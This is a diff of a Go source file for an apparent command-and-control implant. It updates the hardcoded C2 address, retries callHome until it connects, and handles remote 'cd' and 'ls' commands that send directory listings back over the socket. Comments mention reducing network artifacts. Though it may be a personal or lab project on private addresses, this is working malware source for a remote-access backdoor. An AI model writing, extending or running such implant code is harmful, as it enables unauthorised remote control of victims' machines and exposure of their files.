@@ -102,7 +102,7 @@ func terminate() {
 // Test this once home //Once it works I think it would be smart to store the data of this server side in session struct to leave less artifacts 3al network.
 func cd(conn *net.Conn, pImplantWD *string) {
 	(*conn).Write([]byte("OK\n"))
-	buff := make([]byte, 99999)
+	buff := make([]byte, 100)
 	read_len, err := (*conn).Read(buff)
 	if err != nil {
 		fmt.Println("Something went wrong")
@@ -127,22 +127,6 @@ func cd(conn *net.Conn, pImplantWD *string) {
 		return
 	}
 	(*conn).Write([]byte("OK\n"))
-	//Old Method
-	// regexCD := regexp.MustCompile(`cd\s+.+`)
-	// matchCD := regexCD.FindString(string(buffSnapped))
-	// if matchCD != "" {
-	// 	dir2go := strings.Split(matchCD, " ")[1]
-	// 	// implantWD := os.Chdir(dir2go)
-	// 	if os.Chdir(dir2go) != nil {
-	// 		//(*conn).Write([]byte("Error getting the dir\n"))
-	// 		fmt.Println("Couldn't find the dir")
-	// 	} else {
-	// 		*pImplantWD, _ = os.Getwd()
-	// 		fmt.Println(*pImplantWD)
-	// 		fmt.Println("Exiting")
-	// 		//(*conn).Write([]byte(*pImplantWD + "\n"))
-	// 	}
-	// }
 }
 
 func ls(conn *net.Conn, implantWD *string) {
@@ -154,19 +138,15 @@ func ls(conn *net.Conn, implantWD *string) {
 	}
 	(*conn).Write([]byte("\n" + "		SIZE		" + "MODE		" + "	NAME" + "\n" +
 		"		----		" + "----		" + "	----" + "\n" +
-		dirListing + "\n")) //Looks funky but I want it organized
+		dirListing + "\n")) //Looks funky but I want it organized. Write this server side later.
 }
 
 func main() {
-	c2Address := "192.168.68.190:443"
+	c2Address := "192.168.0.106:9003"
 	attempts := 0
 	implantWD, _ := os.Getwd()
 	fmt.Println("Implant Started")
 	conn, result := callHome(&c2Address, &attempts)
-	// if !result {
-	// 	fmt.Println("Couldn't call home")
-	// 	os.Exit(0)
-	// }
 	for !result {
 		conn, result = callHome(&c2Address, &attempts)
 	}
